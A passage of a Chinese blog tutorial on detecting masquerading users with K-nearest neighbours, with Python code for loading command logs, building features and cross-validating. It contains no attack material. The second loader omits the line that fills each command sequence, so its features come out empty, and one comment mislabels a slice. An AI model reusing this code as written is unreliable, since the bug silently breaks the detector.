[]\t\t#存储所有命令</span><br><span class=\"line\">\twith open(filename) as f:</span><br><span class=\"line\">\t\ti &#x3D; 0</span><br><span class=\"line\">\t\tx &#x3D; []\t\t\t#存储每个操作序列</span><br><span class=\"line\">\t\tfor line in f:</span><br><span class=\"line\">\t\t\tline &#x3D; line.strip(&#39;\\n&#39;)\t\t#去掉空行</span><br><span class=\"line\">\t\t\tx.append(line)\t\t\t\t#组合成操作序列</span><br><span class=\"line\">\t\t\tdist.append(line)\t\t\t#添加操作命令</span><br><span class=\"line\">\t\t\ti+&#x3D;1</span><br><span class=\"line\">\t\t\tif i&#x3D;&#x3D;100:</span><br><span class=\"line\">\t\t\t\tcmd_list.append(x)\t\t#每计数100个添加操作序列</span><br><span class=\"line\">\t\t\t\tx &#x3D; []\t\t\t\t\t#然后将操作序列清空</span><br><span class=\"line\">\t\t\t\ti &#x3D; 0</span><br></pre></td></tr></table></figure>\n<p>我们需要统计使用频率最高的50个命令和最低的50个命令，以判断用户的操作习惯，所以略微修改一下读入的函数：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def load_user_cmd(filename):</span><br><span class=\"line\">\tcmd_list &#x3D; []\t\t#存储所有操作序列</span><br><span class=\"line\">\tdist_max &#x3D; []\t\t#存储用户使用频率最高的50个命令</span><br><span class=\"line\">\tdist_min &#x3D; []\t\t#存储用户使用频率最低的50个命令</span><br><span class=\"line\">\tdist     &#x3D; []\t\t#存储所有命令</span><br><span class=\"line\">\twith open(filename) as f:</span><br><span class=\"line\">\t\ti &#x3D; 0</span><br><span class=\"line\">\t\tx &#x3D; []\t\t\t#存储每个操作序列</span><br><span class=\"line\">\t\tfor line in f:</span><br><span class=\"line\">\t\t\tline &#x3D; line.strip(&#39;\\n&#39;)\t\t#去掉空行</span><br><span class=\"line\">\t\t\tx.append(line)\t\t\t\t#组合成操作序列</span><br><span class=\"line\">\t\t\tdist.append(line)\t\t\t#添加操作命令</span><br><span class=\"line\">\t\t\ti+&#x3D;1</span><br><span class=\"line\">\t\t\tif i&#x3D;&#x3D;100:</span><br><span class=\"line\">\t\t\t\tcmd_list.append(x)\t\t#每计数100个添加操作序列</span><br><span class=\"line\">\t\t\t\tx &#x3D; []\t\t\t\t\t#然后将操作序列清空</span><br><span class=\"line\">\t\t\t\ti &#x3D; 0</span><br><span class=\"line\">\tfdist    &#x3D; sorted(FreqDist(dist).items(),key &#x3D; operator.itemgetter(1),reverse &#x3D; True)\t#获得操作命令使用频率并排序</span><br><span class=\"line\">\tdist_max &#x3D; set([item[0] for item in fdist[:50]])\t\t#取出前50个操作命令的指令</span><br><span class=\"line\">\tdist_min &#x3D; set([item[0] for item in fdist[-50:]])\t\t#取出前50个操作命令的指令</span><br><span class=\"line\">\treturn cmd_list,dist_max,dist_min </span><br></pre></td></tr></table></figure>\n<p>使用FreqDist和operator.itemgetter之前记得首先要import一下：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from nltk.probability import FreqDist</span><br><span class=\"line\">import operator</span><br></pre></td></tr></table></figure>\n<p>注意，这里我跟兜哥的代码不相同，兜哥原本获取操作指令频率的命令是：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fdist &#x3D; FreqDist(dist).keys()</span><br><span class=\"line\">dist_max&#x3D;set(fdist[0:50])</span><br><span class=\"line\">dist_min &#x3D; set(fdist[-50:])</span><br><span class=\"line\">return cmd_list,dist_max,dist_min</span><br></pre></td></tr></table></figure>\n<p>然而这样获取的keys()是随机的，不是按照使用频率排序的，故后面都会出错（尽管我用兜哥的源代码仍然跑的概率和书上不同，改对后也不同）。set其实没有必要用，因为keys一定不会重复的，但是这样用也没有问题，向兜哥致敬吧，所以我没有把set去掉。<br />\n数据搜集和清洗的操作完成了，接下来将数据<strong>特征化</strong>。</p>\n<h4 id=\"2-特征化\"><a class=\"markdownIt-Anchor\" href=\"#2-特征化\"></a> 2、特征化</h4>\n<p>（1）获得每个操作序列去重后的指令个数：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f1&#x3D;len(set(cmd_block))</span><br></pre></td></tr></table></figure>\n<p>（2）获得每个操作序列使用前10以及后10的命令（这里依旧和兜哥的源代码不同）：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fdist &#x3D; sorted(FreqDist(cmd_block).items(),key &#x3D; operator.itemgetter(1),reverse &#x3D; True)</span><br><span class=\"line\">f2 \t  &#x3D; [item[0] for item in fdist[:10]]</span><br><span class=\"line\">f3\t  &#x3D; [item[0] for item in fdist[-10:]]</span><br></pre></td></tr></table></figure>\n<p>KNN只能以标量作为输入参数，所以需要将f2和f3表量化，最简单的方式就是和统计的最频繁使用的前50个命令以及最不频繁的50个命令计算重合度：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">              f2        &#x3D; len(set(f2) &amp; set(dist_max))</span><br><span class=\"line\">f3        &#x3D; len(set(f3) &amp; set(dist_min))</span><br></pre></td></tr></table></figure>\n<p>最终，特征化函数为：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def get_user_cmd_feature(user_cmd_list,dist_max,dist_min):</span><br><span class=\"line\">\tuser_cmd_feature &#x3D; []</span><br><span class=\"line\">\tfor cmd_block in user_cmd_list:</span><br><span class=\"line\">\t\tf1 \t  &#x3D; len(set(cmd_block))</span><br><span class=\"line\">\t\tfdist &#x3D; sorted(FreqDist(cmd_block).items(),key &#x3D; operator.itemgetter(1),reverse &#x3D; True)</span><br><span class=\"line\">\t\tf2 \t  &#x3D; [item[0] for item in fdist[:10]]</span><br><span class=\"line\">\t\tf3\t  &#x3D; [item[0] for item in fdist[-10:]]</span><br><span class=\"line\">\t\tf2\t  &#x3D; len(set(f2) &amp; set(dist_max))</span><br><span class=\"line\">\t\tf3        &#x3D; len(set(f3) &amp; set(dist_min))</span><br><span class=\"line\">\t\tx \t  &#x3D; [f1,f2,f3]</span><br><span class=\"line\">\t\tuser_cmd_feature.append(x)</span><br><span class=\"line\">\treturn user_cmd_feature</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-训练数据\"><a class=\"markdownIt-Anchor\" href=\"#3-训练数据\"></a> 3、训练数据</h4>\n<p>完成了数据读取和特征化后，我们即将开始训练数据，但在此之前，我们还需要把标志操作序列是否异常的标签读进来，提供监督学习：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def get_label(filename,index&#x3D;0):\t\t#读取标签，index+1即用户编号</span><br><span class=\"line\">\tx&#x3D;[]</span><br><span class=\"line\">\twith open(filename) as f:</span><br><span class=\"line\">\t\tfor line in f:</span><br><span class=\"line\">\t\t\tline &#x3D; line.strip(&#39;\\n&#39;)</span><br><span class=\"line\">\t\t\tx.append(int(line.split()[index]))</span><br><span class=\"line\">\treturn x</span><br></pre></td></tr></table></figure>\n<p>加载user3的数据，然后进行测试和训练，前N个用作训练，其余的用作测试：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#读取用户操作序列，并做数据清洗</span><br><span class=\"line\">\tuser_cmd_list,user_cmd_dist_max,user_cmd_dist_min &#x3D; load_user_cmd(&#39;..&#x2F;Capter5&#x2F;MasqueradeDat&#x2F;User3&#39;)</span><br><span class=\"line\">\t#将数据特征化</span><br><span class=\"line\">\tuser_cmd_feature &#x3D; get_user_cmd_feature(user_cmd_list,user_cmd_dist_max,user_cmd_dist_min)</span><br><span class=\"line\">\t#获得操作序列的标签</span><br><span class=\"line\">\tlabels &#x3D; get_label(&#39;..&#x2F;Capter5&#x2F;MasqueradeDat&#x2F;label.txt&#39;,2)</span><br><span class=\"line\">\t#label.txt中只有后100个序列的标签，前50个都是正常用户的操作序列</span><br><span class=\"line\">\ty &#x3D; [0]*50 + labels</span><br><span class=\"line\">\t#x代表特征化的数据，这里取了前N个数据</span><br><span class=\"line\">\tx_train &#x3D; user_cmd_feature[0:N]</span><br><span class=\"line\">\t#y代表数据的标签，这里取了前N个数据的标签</span><br><span class=\"line\">\ty_train  &#x3D; y[0:N]</span><br><span class=\"line\">\t#N个以后的都用作测试</span><br><span class=\"line\">\tx_test  &#x3D; user_cmd_feature[N:150]</span><br><span class=\"line\">\ty_test  &#x3D; y[N:150]</span><br></pre></td></tr></table></figure>\n<p>接下来要调用skearn的库来操作，首先需要import一下：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from sklearn.neighbors import KNeighborsClassifier</span><br><span class=\"line\">import numpy as np</span><br></pre></td></tr></table></figure>\n<p>接下来调用KNN函数进行训练：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">       neigh   &#x3D; KNeighborsClassifier(n_neighbors &#x3D; 3)</span><br><span class=\"line\">neigh.fit(x_train,y_train)</span><br></pre></td></tr></table></figure>\n<p>然后预测结果，并获得 准确率：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">y_predict &#x3D; neigh.predict(x_test)</span><br><span class=\"line\">score &#x3D; np.mean(y_test &#x3D;&#x3D; y_predict)*100</span><br><span class=\"line\">print(score)</span><br></pre></td></tr></table></figure>\n<p>书上说是用前120个操作序列进行训练，后30进行测试，准确率是80%，然而无论我用书上的代码还是兜哥GitHub上的源代码跑出的准确率都是100%……包括我自己修正后的代码也是100，不过将训练的数据减小到50个，我修正后的代码跑出的准确率为89%:</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">89.0</span><br><span class=\"line\"></span><br><span class=\"line\">***Repl Closed***</span><br></pre></td></tr></table></figure>\n<p>OK，将所有代码整合在一起，如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">\t@DateTime: \t2018-01-24 14:36:02</span><br><span class=\"line\">\t@Version: \t1.0</span><br><span class=\"line\">\t@Author: \tUnname_Bao</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">from nltk.probability import FreqDist</span><br><span class=\"line\">import operator</span><br><span class=\"line\">from sklearn.neighbors import KNeighborsClassifier</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">N &#x3D; 50</span><br><span class=\"line\">def load_user_cmd(filename):</span><br><span class=\"line\">\tcmd_list &#x3D; []\t\t#存储所有操作序列</span><br><span class=\"line\">\tdist_max &#x3D; []\t\t#存储用户使用频率最高的50个命令</span><br><span class=\"line\">\tdist_min &#x3D; []\t\t#存储用户使用频率最低的50个命令</span><br><span class=\"line\">\tdist     &#x3D; []\t\t#存储所有命令</span><br><span class=\"line\">\twith open(filename) as f:</span><br><span class=\"line\">\t\ti &#x3D; 0</span><br><span class=\"line\">\t\tx &#x3D; []\t\t\t#存储每个操作序列</span><br><span class=\"line\">\t\tfor line in f:</span><br><span class=\"line\">\t\t\tline &#x3D; line.strip(&#39;\\n&#39;)\t\t#去掉空行</span><br><span class=\"line\">\t\t\tx.append(line)\t\t\t\t#组合成操作序列</span><br><span class=\"line\">\t\t\tdist.append(line)\t\t\t#添加操作命令</span><br><span class=\"line\">\t\t\ti+&#x3D;1</span><br><span class=\"line\">\t\t\tif i&#x3D;&#x3D;100:</span><br><span class=\"line\">\t\t\t\tcmd_list.append(x)\t\t#每计数100个添加操作序列</span><br><span class=\"line\">\t\t\t\tx &#x3D; []\t\t\t\t\t#然后将操作序列清空</span><br><span class=\"line\">\t\t\t\ti &#x3D; 0</span><br><span class=\"line\">\tfdist    &#x3D; sorted(FreqDist(dist).items(),key &#x3D; operator.itemgetter(1),reverse &#x3D; True)\t#获得操作命令使用频率并排序</span><br><span class=\"line\">\tdist_max &#x3D; set([item[0] for item in fdist[:50]])\t\t#取出前50个操作命令的指令</span><br><span class=\"line\">\tdist_min &#x3D; set([item[0] for item in fdist[-50:]])\t\t#取出前50个操作命令的指令</span><br><span class=\"line\">\treturn cmd_list,dist_max,dist_min </span><br><span class=\"line\"></span><br><span class=\"line\">def get_user_cmd_feature(user_cmd_list,dist_max,dist_min):</span><br><span class=\"line\">\tuser_cmd_feature &#x3D; []</span><br><span class=\"line\">\tfor cmd_block in user_cmd_list:</span><br><span class=\"line\">\t\tf1 \t  &#x3D; len(set(cmd_block))</span><br><span class=\"line\">\t\tfdist &#x3D; sorted(FreqDist(cmd_block).items(),key &#x3D; operator.itemgetter(1),reverse &#x3D; True)</span><br><span class=\"line\">\t\tf2 \t  &#x3D; [item[0] for item in fdist[:10]]</span><br><span class=\"line\">\t\tf3\t  &#x3D; [item[0] for item in fdist[-10:]]</span><br><span class=\"line\">\t\tf2\t  &#x3D; len(set(f2) &amp; set(dist_max))</span><br><span class=\"line\">\t\tf3    &#x3D; len(set(f3) &amp; set(dist_min))</span><br><span class=\"line\">\t\tx \t  &#x3D; [f1,f2,f3]</span><br><span class=\"line\">\t\tuser_cmd_feature.append(x)</span><br><span class=\"line\">\treturn user_cmd_feature</span><br><span class=\"line\"></span><br><span class=\"line\">def get_label(filename,index&#x3D;0):\t\t#读取标签，index+1即用户编号</span><br><span class=\"line\">\tx&#x3D;[]</span><br><span class=\"line\">\twith open(filename) as f:</span><br><span class=\"line\">\t\tfor line in f:</span><br><span class=\"line\">\t\t\tline &#x3D; line.strip(&#39;\\n&#39;)</span><br><span class=\"line\">\t\t\tx.append(int(line.split()[index]))</span><br><span class=\"line\">\treturn x</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class=\"line\">\t#读取用户操作序列，并做数据清洗</span><br><span class=\"line\">\tuser_cmd_list,user_cmd_dist_max,user_cmd_dist_min &#x3D; load_user_cmd(&#39;..&#x2F;Capter5&#x2F;MasqueradeDat&#x2F;User3&#39;)</span><br><span class=\"line\">\t#将数据特征化</span><br><span class=\"line\">\tuser_cmd_feature &#x3D; get_user_cmd_feature(user_cmd_list,user_cmd_dist_max,user_cmd_dist_min)</span><br><span class=\"line\">\t#获得操作序列的标签</span><br><span class=\"line\">\tlabels &#x3D; get_label(&#39;..&#x2F;Capter5&#x2F;MasqueradeDat&#x2F;label.txt&#39;,2)</span><br><span class=\"line\">\t#label.txt中只有后100个序列的标签，前50个都是正常用户的操作序列</span><br><span class=\"line\">\ty &#x3D; [0]*50 + labels</span><br><span class=\"line\">\t#x代表特征化的数据，这里取了前N个数据</span><br><span class=\"line\">\tx_train &#x3D; user_cmd_feature[0:N]</span><br><span class=\"line\">\t#y代表数据的标签，这里取了前N个数据的标签</span><br><span class=\"line\">\ty_train  &#x3D; y[0:N]</span><br><span class=\"line\">\t#N个以后的都用作测试</span><br><span class=\"line\">\tx_test  &#x3D; user_cmd_feature[N:150]</span><br><span class=\"line\">\ty_test  &#x3D; y[N:150]</span><br><span class=\"line\">\tneigh   &#x3D; KNeighborsClassifier(n_neighbors &#x3D; 3)</span><br><span class=\"line\">\tneigh.fit(x_train,y_train)</span><br><span class=\"line\">\ty_predict &#x3D; neigh.predict(x_test)</span><br><span class=\"line\">\tscore &#x3D; np.mean(y_test &#x3D;&#x3D; y_predict)*100</span><br><span class=\"line\">\tprint(score)</span><br></pre></td></tr></table></figure>\n<h2 id=\"使用k近邻算法检测异常操作二\"><a class=\"markdownIt-Anchor\" href=\"#使用k近邻算法检测异常操作二\"></a> 使用K近邻算法检测异常操作（二）</h2>\n<p>之前的方法只比较了最频繁和最不频繁的操作命令，这次我们尝试一下全量比较。</p>\n<h4 id=\"1-数据搜集和数据清洗\"><a class=\"markdownIt-Anchor\" href=\"#1-数据搜集和数据清洗\"></a> 1、数据搜集和数据清洗</h4>\n<p>由于这次是全量化处理，所以不需要再统计频率了，函数修改成以下：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def load_user_cmd_new(filename):</span><br><span class=\"line\">\tcmd_list &#x3D; []\t\t#存储所有操作序列</span><br><span class=\"line\">\tdist     &#x3D; []\t\t#存储所有命令</span><br><span class=\"line\">\twith open(filename) as f:</span><br><span class=\"line\">\t\ti &#x3D; 0</span><br><span class=\"line\">\t\tx &#x3D; []\t\t\t#存储每个操作序列</span><br><span class=\"line\">\t\tfor line in f:</span><br><span class=\"line\">\t\t\tline &#x3D; line.strip(&#39;\\n&#39;)\t\t#去掉空行</span><br><span class=\"line\">\t\t\tdist.append(line)\t\t\t#添加操作命令</span><br><span class=\"line\">\t\t\ti+&#x3D;1</span><br><span class=\"line\">\t\t\tif i&#x3D;&#x3D;100:</span><br><span class=\"line\">\t\t\t\tcmd_list.append(x)\t\t#每计数100个添加操作序列</span><br><span class=\"line\">\t\t\t\tx &#x3D; []\t\t\t\t\t#然后将操作序列清空</span><br><span class=\"line\">\t\t\t\ti &#x3D; 0</span><br><span class=\"line\">\treturn cmd_list,list(set(dist))</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-特征化-2\"><a class=\"markdownIt-Anchor\" href=\"#2-特征化-2\"></a> 2、特征化</h4>\n<p>特征化也很简单，对于出现过的命令置为1即可：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def get_user_cmd_feature_new(user_cmd_list,dist):</span><br><span class=\"line\">\tuser_cmd_feature &#x3D; []</span><br><span class=\"line\">\tfor cmd_block in user_cmd_list:</span><br><span class=\"line\">\t\tv &#x3D; [0]*len(dist)\t\t\t\t#v为向量，初始全为0</span><br><span class=\"line\">\t\tfor i in range(len(dist)):</span><br><span class=\"line\">\t\t\tif dist[i] in cmd_block:</span><br><span class=\"line\">\t\t\t\tv[i] &#x3D; 1\t\t\t\t#一旦使用过某序号的命令，置为1</span><br><span class=\"line\">\t\tuser_cmd_feature.append(v)</span><br><span class=\"line\">\treturn user_cmd_feature</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-训练数据及验证\"><a class=\"markdownIt-Anchor\" href=\"#3-训练数据及验证\"></a> 3、训练数据及验证</h4>\n<p>和之前类似，这次使用交叉验证，10次随机取样和验证，提高验证可信度。</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#读取用户操作序列，并做数据清洗</span><br><span class=\"line\">user_cmd_list,dist &#x3D; load_user_cmd_new(&#39;..&#x2F;Capter5&#x2F;MasqueradeDat&#x2F;User3&#39;)</span><br><span class=\"line\">#将数据特征化</span><br><span class=\"line\">user_cmd_feature &#x3D; get_user_cmd_feature_new(user_cmd_list,dist)</span><br><span class=\"line\">#获得操作序列的标签</span><br><span class=\"line\">labels &#x3D; get_label(&#39;..&#x2F;Capter5&#x2F;MasqueradeDat&#x2F;label.txt&#39;,2)</span><br><span class=\"line\">#label.txt中只有后100个序列的标签，前50个都是正常用户的操作序列</span><br><span class=\"line\">y &#x3D; [0]*50 + labels</span><br><span class=\"line\">neigh   &#x3D; KNeighborsClassifier(n_neighbors &#x3D; 3)</span><br><span class=\"line\">#交叉验证，10次随机取样，n_jobs&#x3D;-1表示使用全部CPU运行</span><br><span class=\"line\">print(model_selection.cross_val_score(neigh,user_cmd_feature,y,n_jobs&#x3D;-1,cv&#x3D;10))</span><br></pre></td></tr></table></figure>\n<p>最终代码为：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">\t@DateTime: \t2018-01-25 16:22:47</span><br><span class=\"line\">\t@Version: \t1.0</span><br><span class=\"line\">\t@Author: \tUnname_Bao</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">from nltk.probability import FreqDist</span><br><span class=\"line\">import operator</span><br><span class=\"line\">from sklearn.neighbors import KNeighborsClassifier</span><br><span class=\"line\">from sklearn import model_selection</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">def load_user_cmd_new(filename):</span><br><span class=\"line\">\tcmd_list &#x3D; []\t\t#存储所有操作序列</span><br><span class=\"line\">\tdist     &#x3D; []\t\t#存储所有命令</span><br><span class=\"line\">\twith open(filename) as f:</span><br><span class=\"line\">\t\ti &#x3D; 0</span><br><span class=\"line\">\t\tx &#x3D; []\t\t\t#存储每个操作序列</span><br><span class=\"line\">\t\tfor line in f:</span><br><span class=\"line\">\t\t\tline &#x3D; line.strip(&#39;\\n&#39;)\t\t#去掉空行</span><br><span class=\"line\">\t\t\tdist.append(line)\t\t\t#添加操作命令</span><br><span class=\"line\">\t\t\ti+&#x3D;1</span><br><span class=\"line\">\t\t\tif i&#x3D;&#x3D;100:</span><br><span class=\"line\">\t\t\t\tcmd_list.append(x)\t\t#每计数100个添加操作序列</span><br><span class=\"line\">\t\t\t\tx &#x3D; []\t\t\t\t\t#然后将操作序列清空</span><br><span class=\"line\">\t\t\t\ti &#x3D; 0</span><br><span class=\"line\">\treturn cmd_list,list(set(dist))</span><br><span class=\"line\"></span><br><span class=\"line\">def get_user_cmd_feature_new(user_cmd_list,dist):</span><br><span class=\"line\">\tuser_cmd_feature &#x3D; []</span><br><span class=\"line\">\tfor cmd_block in user_cmd_list:</span><br><span class=\"line\">\t\tv &#x3D; [0]*len(dist)\t\t\t\t#v为向量，初始全为0</span><br><span class=\"line\">\t\tfor i in range(len(dist)):</span><br><span class=\"line\">\t\t\tif dist[i] in cmd_block:</span><br><span class=\"line\">\t\t\t\tv[i] &#x3D; 1\t\t\t\t#一旦使用过某序号的命令，置为1</span><br><span class=\"line\">\t\tuser_cmd_feature.append(v)</span><br><span class=\"line\">\treturn user_cmd_feature</span><br><span class=\"line\"></span><br><span class=\"line\">def get_label(filename,index&#x3D;0):\t\t#读取标签，index+1即用户编号</span><br><span class=\"line\">\tx&#x3D;[]</span><br><span class=\"line\">\twith open(filename) as f:</span><br><span class=\"line\">\t\tfor line in f:</span><br><span class=\"line\">\t\t\tline &#x3D; line.strip(&#39;\\n&#39;)</span><br><span class=\"line\">\t\t\tx.append(int(line.split()[index]))</span><br><span class=\"line\">\treturn x</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ 